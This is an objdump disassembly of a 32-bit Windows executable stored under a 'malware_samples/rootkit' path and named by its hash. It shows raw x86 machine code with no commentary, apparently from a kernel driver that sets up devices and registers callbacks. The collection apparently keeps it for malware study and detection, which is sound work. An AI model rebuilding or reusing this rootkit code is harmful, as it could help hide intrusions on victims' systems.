
malware_samples/rootkit/2adf06babe9d56ec5c8ba2eec576bd2625ebd3353892be4c9d7b51b4a8dbe473.exe:     file format pei-i386


Disassembly of section .text:

00010300 <.text>:
   10300:	55                   	push   %ebp
   10301:	8b ec                	mov    %esp,%ebp
   10303:	83 e4 f8             	and    $0xfffffff8,%esp
   10306:	83 ec 14             	sub    $0x14,%esp
   10309:	53                   	push   %ebx
   1030a:	56                   	push   %esi
   1030b:	57                   	push   %edi
   1030c:	68 80 31 01 00       	push   $0x13180
   10311:	8d 44 24 1c          	lea    0x1c(%esp),%eax
   10315:	50                   	push   %eax
   10316:	ff 15 c0 33 01 00    	call   *0x133c0
   1031c:	8d 4c 24 18          	lea    0x18(%esp),%ecx
   10320:	8d 7c 24 0c          	lea    0xc(%esp),%edi
   10324:	8d 74 24 10          	lea    0x10(%esp),%esi
   10328:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   1032f:	00 
   10330:	e8 ab 03 00 00       	call   0x106e0
   10335:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
   1033a:	0f 94 c3             	sete   %bl
   1033d:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
   10342:	74 10                	je     0x10354
   10344:	8b 4c 24 14          	mov    0x14(%esp),%ecx
   10348:	51                   	push   %ecx
   10349:	c6 44 24 14 00       	movb   $0x0,0x14(%esp)
   1034e:	ff 15 c4 33 01 00    	call   *0x133c4
   10354:	5f                   	pop    %edi
   10355:	5e                   	pop    %esi
   10356:	8a c3                	mov    %bl,%al
   10358:	5b                   	pop    %ebx
   10359:	8b e5                	mov    %ebp,%esp
   1035b:	5d                   	pop    %ebp
   1035c:	c3                   	ret
   1035d:	cc                   	int3
   1035e:	cc                   	int3
   1035f:	cc                   	int3
   10360:	8b 44 24 08          	mov    0x8(%esp),%eax
   10364:	50                   	push   %eax
   10365:	ff 15 94 33 01 00    	call   *0x13394
   1036b:	e8 70 06 00 00       	call   0x109e0
   10370:	c2 08 00             	ret    $0x8
   10373:	cc                   	int3
   10374:	cc                   	int3
   10375:	cc                   	int3
   10376:	cc                   	int3
   10377:	cc                   	int3
   10378:	cc                   	int3
   10379:	cc                   	int3
   1037a:	cc                   	int3
   1037b:	cc                   	int3
   1037c:	cc                   	int3
   1037d:	cc                   	int3
   1037e:	cc                   	int3
   1037f:	cc                   	int3
   10380:	55                   	push   %ebp
   10381:	8b ec                	mov    %esp,%ebp
   10383:	6a ff                	push   $0xffffffff
   10385:	68 f8 50 01 00       	push   $0x150f8
   1038a:	68 6a 31 01 00       	push   $0x1316a
   1038f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   10395:	50                   	push   %eax
   10396:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   1039d:	83 ec 14             	sub    $0x14,%esp
   103a0:	53                   	push   %ebx
   103a1:	56                   	push   %esi
   103a2:	57                   	push   %edi
   103a3:	89 65 e8             	mov    %esp,-0x18(%ebp)
   103a6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   103ad:	ff 15 84 33 01 00    	call   *0x13384
   103b3:	84 c0                	test   %al,%al
   103b5:	75 7d                	jne    0x10434
   103b7:	81 7d 10 c8 00 00 00 	cmpl   $0xc8,0x10(%ebp)
   103be:	77 74                	ja     0x10434
   103c0:	e8 3b ff ff ff       	call   0x10300
   103c5:	84 c0                	test   %al,%al
   103c7:	75 13                	jne    0x103dc
   103c9:	6a 00                	push   $0x0
   103cb:	68 80 03 01 00       	push   $0x10380
   103d0:	8b 45 08             	mov    0x8(%ebp),%eax
   103d3:	50                   	push   %eax
   103d4:	ff 15 f4 33 01 00    	call   *0x133f4
   103da:	eb 58                	jmp    0x10434
   103dc:	68 c0 31 01 00       	push   $0x131c0
   103e1:	8d 4d dc             	lea    -0x24(%ebp),%ecx
   103e4:	51                   	push   %ecx
   103e5:	ff 15 c0 33 01 00    	call   *0x133c0
   103eb:	8d 55 e4             	lea    -0x1c(%ebp),%edx
   103ee:	52                   	push   %edx
   103ef:	6a 00                	push   $0x0
   103f1:	68 00 01 00 00       	push   $0x100
   103f6:	6a 00                	push   $0x0
   103f8:	8d 45 dc             	lea    -0x24(%ebp),%eax
   103fb:	50                   	push   %eax
   103fc:	6a 00                	push   $0x0
   103fe:	8b 4d 08             	mov    0x8(%ebp),%ecx
   10401:	51                   	push   %ecx
   10402:	ff 15 b8 33 01 00    	call   *0x133b8
   10408:	85 c0                	test   %eax,%eax
   1040a:	75 28                	jne    0x10434
   1040c:	8b 55 e4             	mov    -0x1c(%ebp),%edx
   1040f:	52                   	push   %edx
   10410:	ff 15 a4 33 01 00    	call   *0x133a4
   10416:	85 c0                	test   %eax,%eax
   10418:	74 1a                	je     0x10434
   1041a:	50                   	push   %eax
   1041b:	6a 01                	push   $0x1
   1041d:	68 60 03 01 00       	push   $0x10360
   10422:	50                   	push   %eax
   10423:	ff 15 bc 33 01 00    	call   *0x133bc
   10429:	eb 09                	jmp    0x10434
   1042b:	b8 01 00 00 00       	mov    $0x1,%eax
   10430:	c3                   	ret
   10431:	8b 65 e8             	mov    -0x18(%ebp),%esp
   10434:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   1043b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   1043e:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   10445:	5f                   	pop    %edi
   10446:	5e                   	pop    %esi
   10447:	5b                   	pop    %ebx
   10448:	8b e5                	mov    %ebp,%esp
   1044a:	5d                   	pop    %ebp
   1044b:	c2 0c 00             	ret    $0xc
   1044e:	cc                   	int3
   1044f:	cc                   	int3
   10450:	55                   	push   %ebp
   10451:	8b ec                	mov    %esp,%ebp
   10453:	83 e4 f8             	and    $0xfffffff8,%esp
   10456:	83 ec 14             	sub    $0x14,%esp
   10459:	56                   	push   %esi
   1045a:	8b 35 c0 33 01 00    	mov    0x133c0,%esi
   10460:	68 e0 31 01 00       	push   $0x131e0
   10465:	8d 44 24 0c          	lea    0xc(%esp),%eax
   10469:	50                   	push   %eax
   1046a:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
   10471:	00 
   10472:	ff d6                	call   *%esi
   10474:	8b 45 08             	mov    0x8(%ebp),%eax
   10477:	8d 4c 24 04          	lea    0x4(%esp),%ecx
   1047b:	51                   	push   %ecx
   1047c:	6a 00                	push   $0x0
   1047e:	68 00 01 00 00       	push   $0x100
   10483:	6a 00                	push   $0x0
   10485:	8d 54 24 18          	lea    0x18(%esp),%edx
   10489:	52                   	push   %edx
   1048a:	6a 24                	push   $0x24
   1048c:	50                   	push   %eax
   1048d:	ff 15 b8 33 01 00    	call   *0x133b8
   10493:	85 c0                	test   %eax,%eax
   10495:	0f 8c c9 00 00 00    	jl     0x10564
   1049b:	68 00 32 01 00       	push   $0x13200
   104a0:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   104a4:	51                   	push   %ecx
   104a5:	ff d6                	call   *%esi
   104a7:	8d 54 24 08          	lea    0x8(%esp),%edx
   104ab:	52                   	push   %edx
   104ac:	8d 44 24 14          	lea    0x14(%esp),%eax
   104b0:	50                   	push   %eax
   104b1:	ff 15 b0 33 01 00    	call   *0x133b0
   104b7:	8b f0                	mov    %eax,%esi
   104b9:	85 f6                	test   %esi,%esi
   104bb:	7d 14                	jge    0x104d1
   104bd:	8b 4c 24 04          	mov    0x4(%esp),%ecx
   104c1:	51                   	push   %ecx
   104c2:	ff 15 90 33 01 00    	call   *0x13390
   104c8:	8b c6                	mov    %esi,%eax
   104ca:	5e                   	pop    %esi
   104cb:	8b e5                	mov    %ebp,%esp
   104cd:	5d                   	pop    %ebp
   104ce:	c2 08 00             	ret    $0x8
   104d1:	8b 55 0c             	mov    0xc(%ebp),%edx
   104d4:	8b 44 24 04          	mov    0x4(%esp),%eax
   104d8:	8b 70 28             	mov    0x28(%eax),%esi
   104db:	52                   	push   %edx
   104dc:	50                   	push   %eax
   104dd:	ff 15 ac 33 01 00    	call   *0x133ac
   104e3:	85 c0                	test   %eax,%eax
   104e5:	89 46 04             	mov    %eax,0x4(%esi)
   104e8:	75 22                	jne    0x1050c
   104ea:	8d 44 24 10          	lea    0x10(%esp),%eax
   104ee:	50                   	push   %eax
   104ef:	ff 15 00 34 01 00    	call   *0x13400
   104f5:	8b 4c 24 04          	mov    0x4(%esp),%ecx
   104f9:	51                   	push   %ecx
   104fa:	ff 15 90 33 01 00    	call   *0x13390
   10500:	b8 0e 00 00 c0       	mov    $0xc000000e,%eax
   10505:	5e                   	pop    %esi
   10506:	8b e5                	mov    %ebp,%esp
   10508:	5d                   	pop    %ebp
   10509:	c2 08 00             	ret    $0x8
   1050c:	6a 18                	push   $0x18
   1050e:	6a 05                	push   $0x5
   10510:	6a 01                	push   $0x1
   10512:	6a 03                	push   $0x3
   10514:	8d 56 08             	lea    0x8(%esi),%edx
   10517:	52                   	push   %edx
   10518:	ff 15 b4 33 01 00    	call   *0x133b4
   1051e:	8b 44 24 04          	mov    0x4(%esp),%eax
   10522:	81 48 1c 00 20 00 00 	orl    $0x2000,0x1c(%eax)
   10529:	8b 44 24 04          	mov    0x4(%esp),%eax
   1052d:	89 06                	mov    %eax,(%esi)
   1052f:	8b 44 24 04          	mov    0x4(%esp),%eax
   10533:	81 60 1c 7f ff ff ff 	andl   $0xffffff7f,0x1c(%eax)
   1053a:	6a 00                	push   $0x0
   1053c:	c7 46 20 01 00 00 00 	movl   $0x1,0x20(%esi)
   10543:	ff 15 9c 33 01 00    	call   *0x1339c
   10549:	6a 01                	push   $0x1
   1054b:	68 24 10 00 00       	push   $0x1024
   10550:	52                   	push   %edx
   10551:	50                   	push   %eax
   10552:	ff 15 a8 33 01 00    	call   *0x133a8
   10558:	6a 00                	push   $0x0
   1055a:	6a 00                	push   $0x0
   1055c:	ff 15 98 33 01 00    	call   *0x13398
   10562:	33 c0                	xor    %eax,%eax
   10564:	5e                   	pop    %esi
   10565:	8b e5                	mov    %ebp,%esp
   10567:	5d                   	pop    %ebp
   10568:	c2 08 00             	ret    $0x8
   1056b:	cc                   	int3
   1056c:	cc                   	int3
   1056d:	cc                   	int3
   1056e:	cc                   	int3
   1056f:	cc                   	int3
   10570:	55                   	push   %ebp
   10571:	8b ec                	mov    %esp,%ebp
   10573:	6a ff                	push   $0xffffffff
   10575:	68 08 51 01 00       	push   $0x15108
   1057a:	68 6a 31 01 00       	push   $0x1316a
   1057f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
   10585:	50                   	push   %eax
   10586:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
   1058d:	83 ec 10             	sub    $0x10,%esp
   10590:	53                   	push   %ebx
   10591:	56                   	push   %esi
   10592:	57                   	push   %edi
   10593:	89 65 e8             	mov    %esp,-0x18(%ebp)
   10596:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
   1059d:	c7 05 54 53 01 00 80 	movl   $0x80,0x15354
   105a4:	00 00 00 
   105a7:	68 00 02 00 00       	push   $0x200
   105ac:	6a 00                	push   $0x0
   105ae:	ff 15 a0 33 01 00    	call   *0x133a0
   105b4:	a3 4c 53 01 00       	mov    %eax,0x1534c
   105b9:	85 c0                	test   %eax,%eax
   105bb:	75 07                	jne    0x105c4
   105bd:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   105c2:	eb 26                	jmp    0x105ea
   105c4:	c6 05 58 53 01 00 01 	movb   $0x1,0x15358
   105cb:	be 80 51 01 00       	mov    $0x15180,%esi
   105d0:	89 75 e4             	mov    %esi,-0x1c(%ebp)
   105d3:	81 fe 84 51 01 00    	cmp    $0x15184,%esi
   105d9:	73 0d                	jae    0x105e8
   105db:	8b 06                	mov    (%esi),%eax
   105dd:	85 c0                	test   %eax,%eax
   105df:	74 02                	je     0x105e3
   105e1:	ff d0                	call   *%eax
   105e3:	83 c6 04             	add    $0x4,%esi
   105e6:	eb e8                	jmp    0x105d0
   105e8:	33 c0                	xor    %eax,%eax
   105ea:	85 c0                	test   %eax,%eax
   105ec:	75 79                	jne    0x10667
   105ee:	8b 7d 0c             	mov    0xc(%ebp),%edi
   105f1:	e8 2a 0d 00 00       	call   0x11320
   105f6:	a1 90 51 01 00       	mov    0x15190,%eax
   105fb:	a8 01                	test   $0x1,%al
   105fd:	74 12                	je     0x10611
   105ff:	8b 0d d4 33 01 00    	mov    0x133d4,%ecx
   10605:	83 39 00             	cmpl   $0x0,(%ecx)
   10608:	74 07                	je     0x10611
   1060a:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1060f:	eb 21                	jmp    0x10632
   10611:	8b 15 90 51 01 00    	mov    0x15190,%edx
   10617:	f7 c2 02 00 00 00    	test   $0x2,%edx
   1061d:	74 11                	je     0x10630
   1061f:	a1 d0 33 01 00       	mov    0x133d0,%eax
   10624:	80 38 00             	cmpb   $0x0,(%eax)
   10627:	74 07                	je     0x10630
   10629:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1062e:	eb 02                	jmp    0x10632
   10630:	33 c0                	xor    %eax,%eax
   10632:	85 c0                	test   %eax,%eax
   10634:	75 31                	jne    0x10667
   10636:	8d 7d e0             	lea    -0x20(%ebp),%edi
   10639:	8b 75 08             	mov    0x8(%ebp),%esi
   1063c:	e8 6f 07 00 00       	call   0x10db0
   10641:	85 c0                	test   %eax,%eax
   10643:	75 22                	jne    0x10667
   10645:	8b 4e 18             	mov    0x18(%esi),%ecx
   10648:	c7 41 04 50 04 01 00 	movl   $0x10450,0x4(%ecx)
   1064f:	50                   	push   %eax
   10650:	68 80 03 01 00       	push   $0x10380
   10655:	56                   	push   %esi
   10656:	ff 15 f4 33 01 00    	call   *0x133f4
   1065c:	eb 09                	jmp    0x10667
   1065e:	b8 01 00 00 00       	mov    $0x1,%eax
   10663:	c3                   	ret
   10664:	8b 65 e8             	mov    -0x18(%ebp),%esp
   10667:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
   1066e:	33 c0                	xor    %eax,%eax
   10670:	8b 4d f0             	mov    -0x10(%ebp),%ecx
   10673:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
   1067a:	5f                   	pop    %edi
   1067b:	5e                   	pop    %esi
   1067c:	5b                   	pop    %ebx
   1067d:	8b e5                	mov    %ebp,%esp
   1067f:	5d                   	pop    %ebp
   10680:	c2 08 00             	ret    $0x8
   10683:	cc                   	int3
   10684:	cc                   	int3
   10685:	cc                   	int3
   10686:	cc                   	int3
   10687:	cc                   	int3
   10688:	cc                   	int3
   10689:	cc                   	int3
   1068a:	cc                   	int3
   1068b:	cc                   	int3
   1068c:	cc                   	int3
   1068d:	cc                   	int3
   1068e:	cc                   	int3
   1068f:	cc                   	int3
   10690:	55                   	push   %ebp
   10691:	8b 6c 24 08          	mov    0x8(%esp),%ebp
   10695:	57                   	push   %edi
   10696:	6a 00                	push   $0x0
   10698:	ff 15 a0 33 01 00    	call   *0x133a0
   1069e:	83 3b 00             	cmpl   $0x0,(%ebx)
   106a1:	89 06                	mov    %eax,(%esi)
   106a3:	89 7e 04             	mov    %edi,0x4(%esi)
   106a6:	89 46 08             	mov    %eax,0x8(%esi)
   106a9:	89 7e 0c             	mov    %edi,0xc(%esi)
   106ac:	75 21                	jne    0x106cf
   106ae:	8b 06                	mov    (%esi),%eax
   106b0:	85 c0                	test   %eax,%eax
   106b2:	75 0c                	jne    0x106c0
   106b4:	c7 03 01 00 00 c0    	movl   $0xc0000001,(%ebx)
   106ba:	8b c6                	mov    %esi,%eax
   106bc:	5d                   	pop    %ebp
   106bd:	c2 04 00             	ret    $0x4
   106c0:	85 ed                	test   %ebp,%ebp
   106c2:	74 0b                	je     0x106cf
   106c4:	57                   	push   %edi
   106c5:	55                   	push   %ebp
   106c6:	50                   	push   %eax
   106c7:	e8 98 2a 00 00       	call   0x13164
   106cc:	83 c4 0c             	add    $0xc,%esp
   106cf:	8b c6                	mov    %esi,%eax
   106d1:	5d                   	pop    %ebp
   106d2:	c2 04 00             	ret    $0x4
   106d5:	cc                   	int3
   106d6:	cc                   	int3
   106d7:	cc                   	int3
   106d8:	cc                   	int3
   106d9:	cc                   	int3
   106da:	cc                   	int3
   106db:	cc                   	int3
   106dc:	cc                   	int3
   106dd:	cc                   	int3
   106de:	cc                   	int3
   106df:	cc                   	int3
   106e0:	83 ec 24             	sub    $0x24,%esp
   106e3:	83 3f 00             	cmpl   $0x0,(%edi)
   106e6:	8d 46 04             	lea    0x4(%esi),%eax
   106e9:	c6 06 00             	movb   $0x0,(%esi)
   106ec:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
   106f2:	75 4f                	jne    0x10743
   106f4:	6a 60                	push   $0x60
   106f6:	6a 01                	push   $0x1
   106f8:	8d 54 24 08          	lea    0x8(%esp),%edx
   106fc:	52                   	push   %edx
   106fd:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
   10701:	8d 4c 24 14          	lea    0x14(%esp),%ecx
   10705:	51                   	push   %ecx
   10706:	68 00 00 10 80       	push   $0x80100000
   1070b:	50                   	push   %eax
   1070c:	c7 44 24 20 18 00 00 	movl   $0x18,0x20(%esp)
   10713:	00 
   10714:	c7 44 24 24 00 00 00 	movl   $0x0,0x24(%esp)
   1071b:	00 
   1071c:	c7 44 24 2c 40 02 00 	movl   $0x240,0x2c(%esp)
   10723:	00 
   10724:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%esp)
   1072b:	00 
   1072c:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%esp)
   10733:	00 
   10734:	ff 15 c8 33 01 00    	call   *0x133c8
   1073a:	85 c0                	test   %eax,%eax
   1073c:	0f 94 c2             	sete   %dl
   1073f:	89 07                	mov    %eax,(%edi)
   10741:	88 16                	mov    %dl,(%esi)
   10743:	8b c6                	mov    %esi,%eax
   10745:	83 c4 24             	add    $0x24,%esp
   10748:	c3                   	ret
   10749:	cc                   	int3
   1074a:	cc                   	int3
   1074b:	cc                   	int3
   1074c:	cc                   	int3
   1074d:	cc                   	int3
   1074e:	cc                   	int3
   1074f:	cc                   	int3
   10750:	83 ec 0c             	sub    $0xc,%esp
   10753:	80 38 00             	cmpb   $0x0,(%eax)
   10756:	75 09                	jne    0x10761
   10758:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1075d:	83 c4 0c             	add    $0xc,%esp
   10760:	c3                   	ret
   10761:	8b 0e                	mov    (%esi),%ecx
   10763:	6a 00                	push   $0x0
   10765:	6a 00                	push   $0x0
   10767:	51                   	push   %ecx
   10768:	52                   	push   %edx
   10769:	8b 50 04             	mov    0x4(%eax),%edx
   1076c:	8d 4c 24 10          	lea    0x10(%esp),%ecx
   10770:	51                   	push   %ecx
   10771:	6a 00                	push   $0x0
   10773:	6a 00                	push   $0x0
   10775:	6a 00                	push   $0x0
   10777:	52                   	push   %edx
   10778:	ff 15 fc 33 01 00    	call   *0x133fc
   1077e:	8b 4c 24 04          	mov    0x4(%esp),%ecx
   10782:	89 0e                	mov    %ecx,(%esi)
   10784:	83 c4 0c             	add    $0xc,%esp
   10787:	c3                   	ret
   10788:	cc                   	int3
   10789:	cc                   	int3
   1078a:	cc                   	int3
   1078b:	cc                   	int3
   1078c:	cc                   	int3
   1078d:	cc                   	int3
   1078e:	cc                   	int3
   1078f:	cc                   	int3
   10790:	83 ec 30             	sub    $0x30,%esp
   10793:	53                   	push   %ebx
   10794:	55                   	push   %ebp
   10795:	56                   	push   %esi
   10796:	57                   	push   %edi
   10797:	33 db                	xor    %ebx,%ebx
   10799:	8d 7c 24 14          	lea    0x14(%esp),%edi
   1079d:	8d 74 24 20          	lea    0x20(%esp),%esi
   107a1:	89 5c 24 14          	mov    %ebx,0x14(%esp)
   107a5:	e8 36 ff ff ff       	call   0x106e0
   107aa:	8b 74 24 14          	mov    0x14(%esp),%esi
   107ae:	3b f3                	cmp    %ebx,%esi
   107b0:	74 25                	je     0x107d7
   107b2:	38 5c 24 20          	cmp    %bl,0x20(%esp)
   107b6:	0f 84 d5 01 00 00    	je     0x10991
   107bc:	8b 44 24 24          	mov    0x24(%esp),%eax
   107c0:	50                   	push   %eax
   107c1:	88 5c 24 24          	mov    %bl,0x24(%esp)
   107c5:	ff 15 c4 33 01 00    	call   *0x133c4
   107cb:	8b c6                	mov    %esi,%eax
   107cd:	5f                   	pop    %edi
   107ce:	5e                   	pop    %esi
   107cf:	5d                   	pop    %ebp
   107d0:	5b                   	pop    %ebx
   107d1:	83 c4 30             	add    $0x30,%esp
   107d4:	c2 04 00             	ret    $0x4
   107d7:	8a 44 24 20          	mov    0x20(%esp),%al
   107db:	84 c0                	test   %al,%al
   107dd:	75 0f                	jne    0x107ee
   107df:	8b 4c 24 24          	mov    0x24(%esp),%ecx
   107e3:	8b 6c 24 20          	mov    0x20(%esp),%ebp
   107e7:	be 01 00 00 c0       	mov    $0xc0000001,%esi
   107ec:	eb 27                	jmp    0x10815
   107ee:	8b 44 24 24          	mov    0x24(%esp),%eax
   107f2:	6a 05                	push   $0x5
   107f4:	6a 18                	push   $0x18
   107f6:	8d 4c 24 30          	lea    0x30(%esp),%ecx
   107fa:	51                   	push   %ecx
   107fb:	8d 54 24 24          	lea    0x24(%esp),%edx
   107ff:	52                   	push   %edx
   10800:	50                   	push   %eax
   10801:	ff 15 cc 33 01 00    	call   *0x133cc
   10807:	8b 6c 24 30          	mov    0x30(%esp),%ebp
   1080b:	8b 4c 24 34          	mov    0x34(%esp),%ecx
   1080f:	8b f0                	mov    %eax,%esi
   10811:	8a 44 24 20          	mov    0x20(%esp),%al
   10815:	3b f3                	cmp    %ebx,%esi
   10817:	89 74 24 14          	mov    %esi,0x14(%esp)
   1081b:	74 11                	je     0x1082e
   1081d:	84 c0                	test   %al,%al
   1081f:	0f 84 6c 01 00 00    	je     0x10991
   10825:	88 5c 24 20          	mov    %bl,0x20(%esp)
   10829:	e9 58 01 00 00       	jmp    0x10986
   1082e:	3b cb                	cmp    %ebx,%ecx
   10830:	77 08                	ja     0x1083a
   10832:	81 fd 00 00 40 00    	cmp    $0x400000,%ebp
   10838:	76 22                	jbe    0x1085c
   1083a:	84 c0                	test   %al,%al
   1083c:	74 0f                	je     0x1084d
   1083e:	8b 54 24 24          	mov    0x24(%esp),%edx
   10842:	52                   	push   %edx
   10843:	88 5c 24 24          	mov    %bl,0x24(%esp)
   10847:	ff 15 c4 33 01 00    	call   *0x133c4
   1084d:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10852:	5f                   	pop    %edi
   10853:	5e                   	pop    %esi
   10854:	5d                   	pop    %ebp
   10855:	5b                   	pop    %ebx
   10856:	83 c4 30             	add    $0x30,%esp
   10859:	c2 04 00             	ret    $0x4
   1085c:	8b 3d a0 33 01 00    	mov    0x133a0,%edi
   10862:	6a 10                	push   $0x10
   10864:	53                   	push   %ebx
   10865:	89 6c 24 20          	mov    %ebp,0x20(%esp)
   10869:	ff d7                	call   *%edi
   1086b:	8b f0                	mov    %eax,%esi
   1086d:	3b f3                	cmp    %ebx,%esi
   1086f:	74 1d                	je     0x1088e
   10871:	55                   	push   %ebp
   10872:	53                   	push   %ebx
   10873:	ff d7                	call   *%edi
   10875:	89 06                	mov    %eax,(%esi)
   10877:	89 6e 04             	mov    %ebp,0x4(%esi)
   1087a:	89 46 08             	mov    %eax,0x8(%esi)
   1087d:	89 6e 0c             	mov    %ebp,0xc(%esi)
   10880:	39 1e                	cmp    %ebx,(%esi)
   10882:	75 08                	jne    0x1088c
   10884:	c7 44 24 14 01 00 00 	movl   $0xc0000001,0x14(%esp)
   1088b:	c0 
   1088c:	8b de                	mov    %esi,%ebx
   1088e:	8b 44 24 44          	mov    0x44(%esp),%eax
   10892:	8b 78 04             	mov    0x4(%eax),%edi
   10895:	3b df                	cmp    %edi,%ebx
   10897:	74 21                	je     0x108ba
   10899:	85 ff                	test   %edi,%edi
   1089b:	74 1a                	je     0x108b7
   1089d:	8b 07                	mov    (%edi),%eax
   1089f:	85 c0                	test   %eax,%eax
   108a1:	8b 35 f8 33 01 00    	mov    0x133f8,%esi
   108a7:	74 05                	je     0x108ae
   108a9:	6a 00                	push   $0x0
   108ab:	50                   	push   %eax
   108ac:	ff d6                	call   *%esi
   108ae:	6a 00                	push   $0x0
   108b0:	57                   	push   %edi
   108b1:	ff d6                	call   *%esi
   108b3:	8b 44 24 44          	mov    0x44(%esp),%eax
   108b7:	89 58 04             	mov    %ebx,0x4(%eax)
   108ba:	8b 74 24 14          	mov    0x14(%esp),%esi
   108be:	85 f6                	test   %esi,%esi
   108c0:	74 27                	je     0x108e9
   108c2:	80 7c 24 20 00       	cmpb   $0x0,0x20(%esp)
   108c7:	0f 84 c4 00 00 00    	je     0x10991
   108cd:	8b 44 24 24          	mov    0x24(%esp),%eax
   108d1:	50                   	push   %eax
   108d2:	c6 44 24 24 00       	movb   $0x0,0x24(%esp)
   108d7:	ff 15 c4 33 01 00    	call   *0x133c4
   108dd:	8b c6                	mov    %esi,%eax
   108df:	5f                   	pop    %edi
   108e0:	5e                   	pop    %esi
   108e1:	5d                   	pop    %ebp
   108e2:	5b                   	pop    %ebx
   108e3:	83 c4 30             	add    $0x30,%esp
   108e6:	c2 04 00             	ret    $0x4
   108e9:	8b 40 04             	mov    0x4(%eax),%eax
   108ec:	85 c0                	test   %eax,%eax
   108ee:	75 24                	jne    0x10914
   108f0:	38 44 24 20          	cmp    %al,0x20(%esp)
   108f4:	74 0f                	je     0x10905
   108f6:	8b 4c 24 24          	mov    0x24(%esp),%ecx
   108fa:	51                   	push   %ecx
   108fb:	88 44 24 24          	mov    %al,0x24(%esp)
   108ff:	ff 15 c4 33 01 00    	call   *0x133c4
   10905:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   1090a:	5f                   	pop    %edi
   1090b:	5e                   	pop    %esi
   1090c:	5d                   	pop    %ebp
   1090d:	5b                   	pop    %ebx
   1090e:	83 c4 30             	add    $0x30,%esp
   10911:	c2 04 00             	ret    $0x4
   10914:	8b 00                	mov    (%eax),%eax
   10916:	8b d0                	mov    %eax,%edx
   10918:	8d 74 24 18          	lea    0x18(%esp),%esi
   1091c:	8d 44 24 20          	lea    0x20(%esp),%eax
   10920:	e8 2b fe ff ff       	call   0x10750
   10925:	8b f0                	mov    %eax,%esi
   10927:	85 f6                	test   %esi,%esi
   10929:	74 23                	je     0x1094e
   1092b:	80 7c 24 20 00       	cmpb   $0x0,0x20(%esp)
   10930:	74 5f                	je     0x10991
   10932:	8b 54 24 24          	mov    0x24(%esp),%edx
   10936:	52                   	push   %edx
   10937:	c6 44 24 24 00       	movb   $0x0,0x24(%esp)
   1093c:	ff 15 c4 33 01 00    	call   *0x133c4
   10942:	8b c6                	mov    %esi,%eax
   10944:	5f                   	pop    %edi
   10945:	5e                   	pop    %esi
   10946:	5d                   	pop    %ebp
   10947:	5b                   	pop    %ebx
   10948:	83 c4 30             	add    $0x30,%esp
   1094b:	c2 04 00             	ret    $0x4
   1094e:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
   10952:	74 26                	je     0x1097a
   10954:	80 7c 24 20 00       	cmpb   $0x0,0x20(%esp)
   10959:	74 10                	je     0x1096b
   1095b:	8b 44 24 24          	mov    0x24(%esp),%eax
   1095f:	50                   	push   %eax
   10960:	c6 44 24 24 00       	movb   $0x0,0x24(%esp)
   10965:	ff 15 c4 33 01 00    	call   *0x133c4
   1096b:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   10970:	5f                   	pop    %edi
   10971:	5e                   	pop    %esi
   10972:	5d                   	pop    %ebp
   10973:	5b                   	pop    %ebx
   10974:	83 c4 30             	add    $0x30,%esp
   10977:	c2 04 00             	ret    $0x4
   1097a:	80 7c 24 20 00       	cmpb   $0x0,0x20(%esp)
   1097f:	74 10                	je     0x10991
   10981:	c6 44 24 20 00       	movb   $0x0,0x20(%esp)
   10986:	8b 4c 24 24          	mov    0x24(%esp),%ecx
   1098a:	51                   	push   %ecx
   1098b:	ff 15 c4 33 01 00    	call   *0x133c4
   10991:	5f                   	pop    %edi
   10992:	8b c6                	mov    %esi,%eax
   10994:	5e                   	pop    %esi
   10995:	5d                   	pop    %ebp
   10996:	5b                   	pop    %ebx
   10997:	83 c4 30             	add    $0x30,%esp
   1099a:	c2 04 00             	ret    $0x4
   1099d:	cc                   	int3
   1099e:	cc                   	int3
   1099f:	cc                   	int3
   109a0:	55                   	push   %ebp
   109a1:	8b 6c 24 08          	mov    0x8(%esp),%ebp
   109a5:	56                   	push   %esi
   109a6:	8b 75 04             	mov    0x4(%ebp),%esi
   109a9:	3b de                	cmp    %esi,%ebx
   109ab:	74 1f                	je     0x109cc
   109ad:	85 f6                	test   %esi,%esi
   109af:	74 18                	je     0x109c9
   109b1:	8b 06                	mov    (%esi),%eax
   109b3:	85 c0                	test   %eax,%eax
   109b5:	57                   	push   %edi
   109b6:	8b 3d f8 33 01 00    	mov    0x133f8,%edi
   109bc:	74 05                	je     0x109c3
   109be:	6a 00                	push   $0x0
   109c0:	50                   	push   %eax
   109c1:	ff d7                	call   *%edi
   109c3:	6a 00                	push   $0x0
   109c5:	56                   	push   %esi
   109c6:	ff d7                	call   *%edi
   109c8:	5f                   	pop    %edi
   109c9:	89 5d 04             	mov    %ebx,0x4(%ebp)
   109cc:	5e                   	pop    %esi
   109cd:	5d                   	pop    %ebp
   109ce:	c2 04 00             	ret    $0x4
   109d1:	cc                   	int3
   109d2:	cc                   	int3
   109d3:	cc                   	int3
   109d4:	cc                   	int3
   109d5:	cc                   	int3
   109d6:	cc                   	int3
   109d7:	cc                   	int3
   109d8:	cc                   	int3
   109d9:	cc                   	int3
   109da:	cc                   	int3
   109db:	cc                   	int3
   109dc:	cc                   	int3
